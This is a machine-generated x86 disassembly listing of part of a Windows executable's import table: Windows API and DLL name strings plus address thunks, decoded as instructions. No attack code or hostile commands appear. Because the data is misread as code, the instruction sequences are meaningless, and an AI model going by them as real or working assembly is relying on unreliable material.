  428806:	add    BYTE PTR [eax],al
  428808:	mov    al,0x1
  42880a:	dec    esp
  42880b:	outs   dx,DWORD PTR ds:[esi]
  42880c:	popa   
  42880d:	fs dec ecx
  42880f:	arpl   WORD PTR [edi+0x6e],bp
  428812:	push   edi
  428813:	add    BYTE PTR [ecx+0x57734901],ah
  428819:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428820:	popa   
  428821:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428825:	add    BYTE PTR ds:0x74654701,dl
  42882b:	inc    esi
  42882c:	outs   dx,DWORD PTR ds:[esi]
  42882d:	jb     0x428894
  42882f:	addr16 jb 0x4288a1
  428832:	jne    0x4288a2
  428834:	fs push edi
  428836:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42883d:	add    DWORD PTR [edi+0x65],eax
  428840:	je     0x428899
  428842:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428849:	js     0x4288bf
  42884b:	inc    ecx
  42884c:	add    BYTE PTR [eax],al
  42884e:	add    DWORD PTR ds:[edi+0x65],eax
  428852:	je     0x4288a1
  428854:	gs jae 0x4288ca
  428857:	popa   
  428858:	addr16 gs push edi
  42885b:	add    BYTE PTR [ebx],ch
  42885d:	add    dl,BYTE PTR [ebx+0x65]
  428860:	outs   dx,BYTE PTR ds:[esi]
  428861:	fs dec ebp
  428863:	gs jae 0x4288d9
  428866:	popa   
  428867:	addr16 gs push edi
  42886a:	add    BYTE PTR [eax],al
  42886c:	das    
  42886d:	add    dl,BYTE PTR [ebx+0x65]
  428870:	je     0x4288b3
  428872:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428876:	gs push edi
  428878:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42887f:	add    dl,BYTE PTR [edx+0x65]
  428882:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42888a:	popa   
  42888b:	jae    0x428900
  42888d:	inc    ebp
  42888e:	js     0x4288e7
  428890:	add    BYTE PTR [eax],al
  428892:	and    DWORD PTR [edx],eax
  428894:	push   ebx
  428895:	outs   dx,BYTE PTR gs:[esi]
  428897:	fs inc esp
  428899:	ins    BYTE PTR es:[edi],dx
  42889a:	addr16 dec ecx
  42889c:	je     0x428903
  42889e:	ins    DWORD PTR es:[edi],dx
  42889f:	dec    ebp
  4288a0:	gs jae 0x428916
  4288a3:	popa   
  4288a4:	addr16 gs inc ecx
  4288a7:	add    BYTE PTR ds:0x74654701,bh
  4288ad:	dec    ebp
  4288ae:	gs jae 0x428924
  4288b1:	popa   
  4288b2:	addr16 gs push esp
  4288b5:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  4288bc:	inc    ebx
  4288bd:	popa   
  4288be:	jae    0x428923
  4288c0:	popa   
  4288c1:	fs gs push edi
  4288c4:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4288cb:	add    bh,bl
  4288cd:	add    BYTE PTR [ebp+0x78],al
  4288d0:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4288d8:	jae    0x42891f
  4288da:	js     0x4288dc
  4288dc:	repnz add DWORD PTR [eax+0x6f],edx
  4288e0:	jae    0x428956
  4288e2:	dec    ebp
  4288e3:	gs jae 0x428959
  4288e6:	popa   
  4288e7:	addr16 gs push edi
  4288ea:	add    BYTE PTR [eax],al
  4288ec:	add    DWORD PTR fs:[edi+0x65],eax
  4288f0:	je     0x428947
  4288f2:	jo     0x428958
  4288f4:	popa   
  4288f5:	je     0x42895c
  4288f7:	push   edx
  4288f8:	outs   dx,BYTE PTR ds:[si]
  4288fa:	add    BYTE PTR [eax],al
  4288fc:	mov    BYTE PTR [edx],al
  4288fe:	push   esp
  4288ff:	popa   
  428900:	bound  esp,QWORD PTR [edx+0x65]
  428903:	fs push esp
  428905:	gs js  0x42897c
  428908:	dec    edi
  428909:	jne    0x42897f
  42890b:	push   edi
  42890c:	add    BYTE PTR [eax],al
  42890e:	test   eax,0x616f4c01
  428913:	fs inc edx
  428915:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42891d:	add    BYTE PTR [edx+esi*2+0x61],al
  428921:	ja     0x428976
  428923:	je     0x428986
  428925:	je     0x42898c
  428927:	push   edi
  428928:	add    BYTE PTR [eax],al
  42892a:	ja     0x42892d
  42892c:	inc    edi
  42892d:	gs je  0x428987
  428930:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428937:	js     0x4289ad
  428939:	dec    esp
  42893a:	outs   dx,BYTE PTR gs:[esi]
  42893c:	addr16 je 0x4289a7
  42893f:	push   edi
  428940:	add    BYTE PTR [eax],al
  428942:	cmp    BYTE PTR [eax],al
  428944:	inc    ebx
  428945:	push   0x70557261
  42894a:	jo     0x4289b1
  42894c:	jb     0x428990
  42894e:	jne    0x4289b6
  428950:	push   di
  428952:	add    BYTE PTR [eax],al
  428954:	daa    
  428955:	add    DWORD PTR [edi+0x65],eax
  428958:	je     0x4289a5
  42895a:	gs jns 0x4289bf
  42895d:	outs   dx,DWORD PTR ds:[esi]
  42895e:	popa   
  42895f:	jb     0x4289c5
  428961:	push   esp
  428962:	jns    0x4289d4
  428964:	add    BYTE PTR gs:[ebx+0x1],cl
  428968:	inc    edi
  428969:	gs je  0x4289bc
  42896c:	jb     0x4289dd
  42896e:	jo     0x4289c7
  428970:	add    BYTE PTR [eax],al
  428972:	dec    ebp
  428973:	add    BYTE PTR [ebx+0x6f],al
  428976:	jo     0x4289f1
  428978:	push   edx
  428979:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42897e:	sub    eax,0x61684300
  428983:	jb     0x4289d3
  428985:	gs js  0x4289fc
  428988:	push   edi
  428989:	add    BYTE PTR [eax+0x43734901],dl
  42898f:	push   0x6f4c7261
  428994:	ja     0x4289fb
  428996:	jb     0x4289d9
  428998:	add    BYTE PTR [eax],al
  42899a:	sub    BYTE PTR [ecx],al
  42899c:	inc    edi
  42899d:	gs je  0x4289ec
  4289a0:	popa   
  4289a1:	jae    0x428a17
  4289a3:	inc    ecx
  4289a4:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  4289a8:	gs push eax
  4289aa:	outs   dx,DWORD PTR ds:[esi]
  4289ab:	jo     0x428a22
  4289ad:	jo     0x4289af
  4289af:	add    BYTE PTR [ebx+0x616f4c01],bh
  4289b5:	fs push ebx
  4289b7:	je     0x428a2b
  4289b9:	imul   ebp,DWORD PTR [esi+0x67],0x16d0041
  4289c0:	inc    edi
  4289c1:	gs je  0x428a1b
  4289c4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4289cb:	outs   dx,BYTE PTR ds:[esi]
  4289cc:	addr16 push edi
  4289ce:	add    BYTE PTR [eax],al
  4289d0:	leave  
  4289d1:	add    DWORD PTR [ebp+0x61],ecx
  4289d4:	jo     0x428a2d
  4289d6:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4289dd:	imul   ebp,DWORD PTR [esi+0x74],0x350073
  4289e4:	inc    ebx
  4289e5:	push   0x6f547261
  4289ea:	dec    edi
  4289eb:	gs ins DWORD PTR es:[edi],dx
  4289ed:	push   edi
  4289ee:	add    BYTE PTR [eax],al
  4289f0:	push   ebp
  4289f1:	push   ebx
  4289f2:	inc    ebp
  4289f3:	push   edx
  4289f4:	xor    esi,DWORD PTR [edx]
  4289f6:	cs fs ins BYTE PTR es:[edi],dx
  4289f9:	ins    BYTE PTR es:[edi],dx
  4289fa:	add    BYTE PTR [eax],al
  4289fc:	xchg   edx,eax
  4289fd:	add    edx,DWORD PTR [edx+0x74]
  428a00:	ins    BYTE PTR es:[edi],dx
  428a01:	dec    ecx
  428a02:	outs   dx,BYTE PTR ds:[esi]
  428a03:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  428a0b:	jb     0x428a76
  428a0d:	outs   dx,BYTE PTR ds:[esi]
  428a0e:	add    BYTE PTR [bp+0x74],ch
  428a12:	fs ins BYTE PTR es:[edi],dx
  428a14:	ins    BYTE PTR es:[edi],dx
  428a15:	cs fs ins BYTE PTR es:[edi],dx
  428a18:	ins    BYTE PTR es:[edi],dx
  428a19:	add    BYTE PTR ds:0x74654702,al
  428a1f:	dec    esp
  428a20:	outs   dx,DWORD PTR ds:[esi]
  428a21:	arpl   WORD PTR [ecx+0x6c],sp
  428a24:	gs dec ecx
  428a26:	outs   dx,BYTE PTR ds:[esi]
  428a27:	outs   dx,WORD PTR ds:[esi]
  428a29:	push   edi
  428a2a:	add    BYTE PTR [eax],al
  428a2c:	inc    ebp
  428a2d:	add    al,BYTE PTR [edi+0x65]
  428a30:	je     0x428a82
  428a32:	jb     0x428aa3
  428a34:	arpl   WORD PTR [ecx+0x64],ax
  428a37:	fs jb  0x428a9f
  428a3a:	jae    0x428aaf
  428a3c:	add    BYTE PTR [eax],al
  428a3e:	rol    DWORD PTR [eax],cl
  428a40:	inc    ebx
  428a41:	jb     0x428aa8
  428a43:	popa   
  428a44:	je     0x428aab
  428a46:	inc    esi
  428a47:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  428a4f:	outs   dx,BYTE PTR ds:[esi]
  428a50:	addr16 push edi
  428a52:	add    BYTE PTR [eax],al
  428a54:	sub    BYTE PTR [ebx+edx*2],al
  428a57:	gs je  0x428aa2
  428a5a:	popa   
  428a5b:	outs   dx,BYTE PTR ds:[esi]
  428a5c:	fs ins BYTE PTR es:[edi],dx
  428a5e:	gs inc ebx
  428a60:	outs   dx,DWORD PTR ds:[esi]
  428a61:	jne    0x428ad1
  428a63:	je     0x428a65
  428a65:	add    ah,bl
  428a67:	add    BYTE PTR [ebx+0x72],al
  428a6a:	gs popa 
  428a6c:	je     0x428ad3
  428a6e:	dec    ebp
  428a6f:	popa   
  428a70:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  428a78:	pop    DWORD PTR [ecx]
  428a7a:	inc    edi
  428a7b:	gs je  0x428abf
  428a7e:	je     0x428aef
  428a80:	ins    DWORD PTR es:[edi],dx
  428a81:	dec    esi
  428a82:	popa   
  428a83:	ins    DWORD PTR es:[edi],dx
  428a84:	gs inc ecx
  428a86:	add    BYTE PTR [eax],al
  428a88:	pusha  
  428a89:	add    al,BYTE PTR [edi+0x65]
  428a8c:	je     0x428ae1
  428a8e:	jns    0x428b03
  428a90:	je     0x428af7
  428a92:	ins    DWORD PTR es:[edi],dx
  428a93:	push   edi
  428a94:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  428a9b:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  428aa2:	jns    0x428ae5
  428aa4:	add    BYTE PTR [eax],al
  428aa6:	aas    
  428aa7:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  428aab:	fs dec esp
  428aad:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  428ab4:	add    BYTE PTR [eax],al
  428ab6:	xchg   ecx,eax
  428ab7:	add    al,BYTE PTR [edi+0x6c]
  428aba:	outs   dx,DWORD PTR ds:[esi]
  428abb:	bound  esp,QWORD PTR [ecx+0x6c]
  428abe:	inc    ecx
  428abf:	ins    BYTE PTR es:[edi],dx
  428ac0:	ins    BYTE PTR es:[edi],dx
  428ac1:	outs   dx,DWORD PTR ds:[esi]
  428ac2:	arpl   WORD PTR [eax],ax
  428ac4:	xchg   edx,eax
  428ac5:	add    al,0x56
  428ac7:	imul   esi,DWORD PTR [edx+0x74],0x516c6175
  428ace:	jne    0x428b35
  428ad0:	jb     0x428b4b
  428ad2:	add    BYTE PTR [eax],al
  428ad4:	test   DWORD PTR [ecx],0x46746547
  428ada:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x657079
  428ae2:	jb     0x428ae5
  428ae4:	inc    esi
  428ae5:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  428aec:	jne    0x428b60
  428aee:	arpl   WORD PTR [ebp+0x57],sp
  428af1:	add    BYTE PTR [eax],bh
  428af3:	add    ecx,DWORD PTR [ebp+0x6f]
  428af6:	jbe    0x428b5d
  428af8:	inc    esi
  428af9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52037600
  428b01:	popa   
  428b02:	imul   esi,DWORD PTR [ebx+0x65],0x65637845
  428b09:	jo     0x428b7f
  428b0b:	imul   ebp,DWORD PTR [edi+0x6e],0x1920000
  428b12:	inc    edi
  428b13:	gs je  0x428b58
  428b16:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  428b1d:	jo     0x428b84
  428b1f:	inc    ecx
  428b20:	add    BYTE PTR [eax],al
  428b22:	and    DWORD PTR [ebx+edx*2],eax
  428b25:	gs je  0x428b6e
  428b28:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  428b30:	bound  esi,QWORD PTR [ebp+0x74]
  428b33:	gs jae 0x428b77
  428b36:	add    BYTE PTR [eax],al
  428b38:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  428b3c:	jbe    0x428ba3
  428b3e:	inc    esi
  428b3f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xbf004178
  428b47:	add    BYTE PTR [ebx+0x6f],al
  428b4a:	jo     0x428bc5
  428b4c:	inc    esi
  428b4d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x51037100
  428b55:	jne    0x428bbc
  428b57:	jb     0x428bd2
  428b59:	push   eax
  428b5a:	gs jb  0x428bc3
  428b5d:	outs   dx,DWORD PTR ds:[esi]
  428b5e:	jb     0x428bcd
  428b60:	popa   
  428b61:	outs   dx,BYTE PTR ds:[esi]
  428b62:	arpl   WORD PTR [ebp+0x43],sp
  428b65:	outs   dx,DWORD PTR ds:[esi]
  428b66:	jne    0x428bd6
  428b68:	je     0x428bcf
  428b6a:	jb     0x428b6c
  428b6c:	sub    DWORD PTR [ebx+edx*2],eax
  428b6f:	gs je  0x428bba
  428b72:	popa   
  428b73:	outs   dx,BYTE PTR ds:[esi]
  428b74:	fs ins BYTE PTR es:[edi],dx
  428b76:	gs dec ecx
  428b78:	outs   dx,BYTE PTR ds:[esi]
  428b79:	outs   dx,WORD PTR ds:[esi]
  428b7b:	jb     0x428bea
  428b7d:	popa   
  428b7e:	je     0x428be9
  428b80:	outs   dx,DWORD PTR ds:[esi]
  428b81:	outs   dx,BYTE PTR ds:[esi]
  428b82:	add    BYTE PTR [eax],al
  428b84:	push   ss
  428b85:	add    DWORD PTR [ebp+0x6e],eax
  428b88:	je     0x428bef
  428b8a:	jb     0x428bcf
  428b8c:	jb     0x428bf7
  428b8e:	je     0x428bf9
  428b90:	arpl   WORD PTR [ecx+0x6c],sp
  428b93:	push   ebx
  428b94:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  428b99:	outs   dx,BYTE PTR ds:[esi]
  428b9a:	add    BYTE PTR [eax],al
  428b9c:	jg     0x428b9f
  428b9e:	inc    esi
  428b9f:	outs   dx,DWORD PTR ds:[esi]
  428ba0:	ins    BYTE PTR es:[edi],dx
  428ba1:	fs push ebx
  428ba3:	je     0x428c17
  428ba5:	imul   ebp,DWORD PTR [esi+0x67],0x4dd0057
  428bac:	ins    BYTE PTR es:[edi],dx
  428bad:	jae    0x428c23
  428baf:	jb     0x428c1d
  428bb1:	outs   dx,BYTE PTR gs:[esi]
  428bb3:	inc    ecx
  428bb4:	add    BYTE PTR [eax],al
  428bb6:	sahf   
  428bb7:	add    DWORD PTR [edi+0x65],eax
  428bba:	je     0x428bff
  428bbc:	outs   dx,DWORD PTR ds:[esi]
  428bbd:	ins    DWORD PTR es:[edi],dx
  428bbe:	ins    DWORD PTR es:[edi],dx
  428bbf:	push   esp
  428bc0:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  428bc7:	add    BYTE PTR [edx+eax*1+0x47],dh
  428bcb:	gs je  0x428c22
  428bce:	push   0x64616572
  428bd3:	push   esp
  428bd4:	imul   ebp,DWORD PTR [ebp+0x65],0x4b000073
  428bdb:	inc    ebp
  428bdc:	push   edx
  428bdd:	dec    esi
  428bde:	inc    ebp
  428bdf:	dec    esp
  428be0:	xor    esi,DWORD PTR [edx]
  428be2:	cs fs ins BYTE PTR es:[edi],dx
  428be5:	ins    BYTE PTR es:[edi],dx
  428be6:	add    BYTE PTR [eax],al
  428be8:	mov    dh,0x1
  428bea:	push   eax
  428beb:	outs   dx,DWORD PTR ds:[esi]
  428bec:	ins    BYTE PTR es:[edi],dx
  428bed:	jns    0x428c56
  428bef:	outs   dx,DWORD PTR ds:[esi]
  428bf0:	outs   dx,BYTE PTR ds:[esi]
  428bf1:	add    BYTE PTR [ecx+eax*1+0x47],ch
  428bf5:	gs je  0x428c47
  428bf8:	bound  ebp,QWORD PTR [edx+0x65]
  428bfb:	arpl   WORD PTR [edi+edx*2+0x0],si
  428bff:	add    BYTE PTR [ebx+0x6c654400],dh
  428c05:	gs je  0x428c6d
  428c08:	inc    esp
  428c09:	inc    ebx
  428c0a:	add    BYTE PTR [eax],al
  428c0c:	rol    DWORD PTR [ecx],1
  428c0e:	push   ebx
  428c0f:	gs ins BYTE PTR es:[edi],dx
  428c11:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428c16:	push   0x65
  428c18:	arpl   WORD PTR [eax+eax*1+0x0],si
  428c1c:	jmp    0x428c1f
  428c1e:	push   ebx
  428c1f:	gs je  0x428c6f
  428c22:	popa   
  428c23:	jo     0x428c72
  428c25:	outs   dx,DWORD PTR ds:[esi]
  428c26:	fs add BYTE PTR gs:[eax],al
  428c2a:	leave  
  428c2b:	add    DWORD PTR [edx+0x6f],edx
  428c2e:	jne    0x428c9e
  428c30:	fs push edx
  428c32:	arpl   WORD PTR gs:[eax+eax*1+0x76],si
  428c37:	add    BYTE PTR [edx+0x69],al
  428c3a:	je     0x428c7e
  428c3c:	ins    BYTE PTR es:[edi],dx
  428c3d:	je     0x428c3f
  428c3f:	add    BYTE PTR [ebx+0x61655201],bh
  428c45:	ins    BYTE PTR es:[edi],dx
  428c46:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428c4d:	je     0x428cc3
  428c4f:	add    BYTE PTR gs:[eax],al
  428c52:	jge    0x428c55
  428c54:	inc    edi
  428c55:	gs je  0x428cab
  428c58:	jns    0x428ccd
  428c5a:	je     0x428cc1
  428c5c:	ins    DWORD PTR es:[edi],dx
  428c5d:	push   eax
  428c5e:	popa   
  428c5f:	ins    BYTE PTR es:[edi],dx
  428c60:	gs je  0x428cd7
  428c63:	gs push ebp
  428c65:	jae    0x428ccc
  428c67:	add    BYTE PTR [eax+0x74654701],cl
  428c6d:	push   esp
  428c6e:	gs js  0x428ce5
  428c71:	inc    ebp
  428c72:	js     0x428ce8
  428c74:	outs   dx,BYTE PTR gs:[esi]
  428c76:	je     0x428cc8
  428c78:	outs   dx,DWORD PTR ds:[esi]
  428c79:	imul   ebp,DWORD PTR [esi+0x74],0x1cb0041
  428c80:	push   ebx
  428c81:	arpl   WORD PTR [ecx+0x6c],sp
  428c84:	gs push esi
  428c86:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  428c8d:	inc    ebp
  428c8e:	js     0x428d04
  428c90:	inc    ebp
  428c91:	js     0x428c93
  428c93:	add    bh,cl
  428c95:	add    DWORD PTR [ebx+0x65],edx
  428c98:	ins    BYTE PTR es:[edi],dx
  428c99:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428c9e:	imul   esi,DWORD PTR [eax+0x52],0xfd006e67
  428ca5:	add    DWORD PTR [ebx+0x65],edx
  428ca8:	je     0x428cfe
  428caa:	gs js  0x428d21
  428cad:	inc    ebx
  428cae:	outs   dx,DWORD PTR ds:[esi]
  428caf:	ins    BYTE PTR es:[edi],dx
  428cb0:	outs   dx,DWORD PTR ds:[esi]
  428cb1:	jb     0x428cb3
  428cb3:	add    BYTE PTR [eax+0x74615001],ch
  428cb9:	push   0x65526f54
  428cbe:	imul   ebp,DWORD PTR [bx+0x6e],0x810000
  428cc6:	inc    ebx
  428cc7:	outs   dx,DWORD PTR ds:[esi]
  428cc8:	ins    DWORD PTR es:[edi],dx
  428cc9:	bound  ebp,QWORD PTR [ecx+0x6e]
  428ccc:	gs push edx
  428cce:	outs   dx,BYTE PTR ds:[si]
  428cd0:	add    BYTE PTR [eax],al
  428cd2:	lods   al,BYTE PTR ds:[esi]
  428cd3:	add    BYTE PTR [ebx+0x72],al
  428cd6:	gs popa 
  428cd8:	je     0x428d3f
  428cda:	push   edx
  428cdb:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ce0:	outs   dx,BYTE PTR ds:[esi]
  428ce1:	dec    ecx
  428ce2:	outs   dx,BYTE PTR ds:[esi]
  428ce3:	imul   esi,DWORD PTR fs:[edx+0x65],0x9a007463
  428ceb:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428cef:	gs push esp
  428cf1:	outs   dx,DWORD PTR ds:[esi]
  428cf2:	add    BYTE PTR [eax],al
  428cf4:	mov    ds:0x65724300,al
  428cf9:	popa   
  428cfa:	je     0x428d61
  428cfc:	dec    ecx
  428cfd:	inc    ebx
  428cfe:	push   edi
  428cff:	add    BYTE PTR [ebp+0x63655201],bh
  428d05:	je     0x428d5d
  428d07:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  428d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d0f:	add    BYTE PTR [ebx+0x72],al
  428d12:	gs popa 
  428d14:	je     0x428d7b
  428d16:	push   eax
  428d17:	popa   
  428d18:	ins    BYTE PTR es:[edi],dx
  428d19:	gs je  0x428d90
  428d1c:	add    BYTE PTR gs:[edi+0x44],al
  428d20:	dec    ecx
  428d21:	xor    esi,DWORD PTR [edx]
  428d23:	cs fs ins BYTE PTR es:[edi],dx
  428d26:	ins    BYTE PTR es:[edi],dx
	...
  428d2f:	add    BYTE PTR [ebx+0x20],ch
  428d32:	add    al,BYTE PTR [eax]
	...
  428d50:	imul   ecx,DWORD PTR [ebp+0x2],0x0
	...
  428d5f:	add    BYTE PTR [ecx+0x64],ch
  428d62:	js     0x428dcd
  428d64:	outs   dx,DWORD PTR fs:[esi]
  428d66:	arpl   WORD PTR cs:[edi+0x6d],bp
  428d6a:	add    BYTE PTR [ebx+0x65],dl
  428d6d:	je     0x428db0
  428d6f:	outs   dx,BYTE PTR ds:[esi]
  428d70:	arpl   WORD PTR [eax+0x6f],bp
  428d73:	jb     0x428dc4
  428d75:	jb     0x428de0
  428d77:	imul   ebp,DWORD PTR [bp+0x61],0x3231406c
  428d7f:	add    BYTE PTR [eax],al
  428d81:	add    BYTE PTR [eax],al
  428d83:	add    al,bh
  428d85:	test   DWORD PTR [edx],eax
  428d87:	add    BYTE PTR [esi+eax*4],dl
  428d8a:	add    al,BYTE PTR [eax]
  428d8c:	xchg   BYTE PTR es:[edx],al
  428d8f:	add    BYTE PTR [eax],bh
  428d91:	xchg   BYTE PTR [edx],al
  428d93:	add    BYTE PTR [eax-0x7a],dl
  428d96:	add    al,BYTE PTR [eax]
  428d98:	xchg   BYTE PTR fs:[edx],al
  428d9b:	add    BYTE PTR [esi-0x7a],bh
  428d9e:	add    al,BYTE PTR [eax]
  428da0:	add    BYTE PTR [eax],al
  428da2:	add    BYTE PTR [eax],al
  428da4:	mov    al,ds:0xbe000286
  428da9:	xchg   BYTE PTR [edx],al
  428dab:	add    ah,cl
  428dad:	xchg   BYTE PTR [edx],al
  428daf:	add    dl,bl
  428db1:	xchg   BYTE PTR [edx],al
  428db3:	add    dh,ch
  428db5:	xchg   BYTE PTR [edx],al
  428db7:	add    ah,bh
  428db9:	xchg   BYTE PTR [edx],al
  428dbb:	add    BYTE PTR [esi],cl
  428dbd:	xchg   DWORD PTR [edx],eax
  428dbf:	add    BYTE PTR [eax],ah
  428dc1:	xchg   DWORD PTR [edx],eax
  428dc3:	add    BYTE PTR [esi],ch
  428dc5:	xchg   DWORD PTR [edx],eax
  428dc7:	add    BYTE PTR [eax-0x79],al
  428dca:	add    al,BYTE PTR [eax]
  428dcc:	push   edx
  428dcd:	xchg   DWORD PTR [edx],eax
  428dcf:	add    BYTE PTR [eax-0x79],ah
  428dd2:	add    al,BYTE PTR [eax]
  428dd4:	outs   dx,BYTE PTR ds:[esi]
  428dd5:	xchg   DWORD PTR [edx],eax
  428dd7:	add    BYTE PTR [eax-0x73fffd79],al
  428ddd:	xchg   DWORD PTR [edx],eax
  428ddf:	add    BYTE PTR [edx-0x4bfffd79],ah
  428de5:	xchg   DWORD PTR [edx],eax
  428de7:	add    dh,al
  428de9:	xchg   DWORD PTR [edx],eax
  428deb:	add    dl,dl
  428ded:	xchg   DWORD PTR [edx],eax
  428def:	add    dl,ah
  428df1:	xchg   DWORD PTR [edx],eax
  428df3:	add    dl,dh
  428df5:	xchg   DWORD PTR [edx],eax
  428df7:	add    BYTE PTR [eax],cl
  428df9:	mov    BYTE PTR [edx],al
  428dfb:	add    BYTE PTR [eax+ecx*4],dl
  428dfe:	add    al,BYTE PTR [eax]
  428e00:	mov    BYTE PTR es:[edx],al
  428e03:	add    BYTE PTR [eax+ecx*4],bh
  428e06:	add    al,BYTE PTR [eax]
  428e08:	dec    esi
  428e09:	mov    BYTE PTR [edx],al
  428e0b:	add    BYTE PTR [eax+ecx*4+0x2],bl
  428e0f:	add    BYTE PTR [eax+ecx*4+0x2],ch
  428e13:	add    BYTE PTR [esi-0x78],bh
  428e16:	add    al,BYTE PTR [eax]
  428e18:	xchg   edx,eax
  428e19:	mov    BYTE PTR [edx],al
  428e1b:	add    BYTE PTR [eax-0x45fffd78],ch
  428e21:	mov    BYTE PTR [edx],al
  428e23:	add    ah,cl
  428e25:	mov    BYTE PTR [edx],al
  428e27:	add    ah,bl
  428e29:	mov    BYTE PTR [edx],al
  428e2b:	add    ah,ch
  428e2d:	mov    BYTE PTR [edx],al
  428e2f:	add    ah,bh
  428e31:	mov    BYTE PTR [edx],al
  428e33:	add    BYTE PTR [esi],cl
  428e35:	mov    DWORD PTR [edx],eax
  428e37:	add    BYTE PTR [ecx+ecx*4],bl
  428e3a:	add    al,BYTE PTR [eax]
  428e3c:	sub    cl,BYTE PTR [ecx-0x76bdfffe]
  428e42:	add    al,BYTE PTR [eax]
  428e44:	push   esp
  428e45:	mov    DWORD PTR [edx],eax
  428e47:	add    BYTE PTR [esi-0x77],ah
  428e4a:	add    al,BYTE PTR [eax]
  428e4c:	jb     0x428dd7
  428e4e:	add    al,BYTE PTR [eax]
  428e50:	jle    0x428ddb
  428e52:	add    al,BYTE PTR [eax]
  428e54:	mov    cl,BYTE PTR [ecx-0x7665fffe]
  428e5a:	add    al,BYTE PTR [eax]
  428e5c:	mov    al,0x89
  428e5e:	add    al,BYTE PTR [eax]
  428e60:	mov    esi,0xd0000289
  428e65:	mov    DWORD PTR [edx],eax
  428e67:	add    dl,ah
  428e69:	mov    DWORD PTR [edx],eax
  428e6b:	add    BYTE PTR [eax],al
  428e6d:	add    BYTE PTR [eax],al
  428e6f:	add    ah,bh
  428e71:	mov    DWORD PTR [edx],eax
  428e73:	add    BYTE PTR [eax],al
  428e75:	add    BYTE PTR [eax],al
  428e77:	add    BYTE PTR [edx],bl
  428e79:	mov    al,BYTE PTR [edx]
  428e7b:	add    BYTE PTR [edx+ecx*4],ch
  428e7e:	add    al,BYTE PTR [eax]
  428e80:	mov    al,BYTE PTR ds:[edx]
  428e83:	add    BYTE PTR [edx+ecx*4+0x2],dl
  428e87:	add    BYTE PTR [esi-0x76],ah
  428e8a:	add    al,BYTE PTR [eax]
  428e8c:	js     0x428e18
  428e8e:	add    al,BYTE PTR [eax]
  428e90:	mov    BYTE PTR [edx-0x7559fffe],cl
  428e96:	add    al,BYTE PTR [eax]
  428e98:	mov    dh,0x8a
  428e9a:	add    al,BYTE PTR [eax]
  428e9c:	les    ecx,FWORD PTR [edx-0x752bfffe]
  428ea2:	add    al,BYTE PTR [eax]
  428ea4:	loop   0x428e30
  428ea6:	add    al,BYTE PTR [eax]
  428ea8:	repnz mov al,BYTE PTR [edx]
  428eab:	add    dh,bh
  428ead:	mov    al,BYTE PTR [edx]
  428eaf:	add    BYTE PTR [eax],dl
  428eb1:	mov    eax,DWORD PTR [edx]
  428eb3:	add    BYTE PTR [edx],ah
  428eb5:	mov    eax,DWORD PTR [edx]
  428eb7:	add    BYTE PTR [eax],bh
  428eb9:	mov    eax,DWORD PTR [edx]
  428ebb:	add    BYTE PTR [esi-0x75],al
  428ebe:	add    al,BYTE PTR [eax]
  428ec0:	push   edx
  428ec1:	mov    eax,DWORD PTR [edx]
  428ec3:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  428ec7:	add    BYTE PTR [ebx+ecx*4-0x7463fffe],al
  428ece:	add    al,BYTE PTR [eax]
  428ed0:	stos   BYTE PTR es:[edi],al
  428ed1:	mov    eax,DWORD PTR [edx]
  428ed3:	add    BYTE PTR [esi-0x37fffd75],dh
  428ed9:	mov    eax,DWORD PTR [edx]
  428edb:	add    BYTE PTR [eax],al
  428edd:	add    BYTE PTR [eax],al
  428edf:	add    al,ch
  428ee1:	mov    eax,DWORD PTR [edx]
  428ee3:	add    dl,dh
  428ee5:	mov    eax,DWORD PTR [edx]
  428ee7:	add    BYTE PTR [eax],al
  428ee9:	mov    WORD PTR [edx],es
  428eeb:	add    BYTE PTR [esp+ecx*4],cl
  428eee:	add    al,BYTE PTR [eax]
  428ef0:	sbb    al,0x8c
  428ef2:	add    al,BYTE PTR [eax]
  428ef4:	sub    cl,BYTE PTR [edx+eax*1+0x28c3600]
  428efb:	add    BYTE PTR [eax-0x74],al
  428efe:	add    al,BYTE PTR [eax]
  428f00:	push   edx
  428f01:	mov    WORD PTR [edx],es
  428f03:	add    BYTE PTR [eax-0x74],ch
  428f06:	add    al,BYTE PTR [eax]
